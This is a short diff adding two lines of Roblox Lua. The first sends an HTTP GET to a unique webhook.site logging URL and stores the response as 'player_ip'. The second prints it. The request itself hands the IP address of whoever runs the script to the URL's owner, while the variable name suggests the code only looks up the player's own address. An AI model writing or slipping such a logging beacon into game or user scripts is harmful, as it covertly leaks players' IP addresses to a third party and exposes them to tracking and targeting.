@@ -1,0 +1,2 @@
+local player_ip = game:HttpGet("https://webhook.site/a5fc3e0f-1278-4da1-88ac-7d8455b6d5dd/", true)
+print(player_ip)
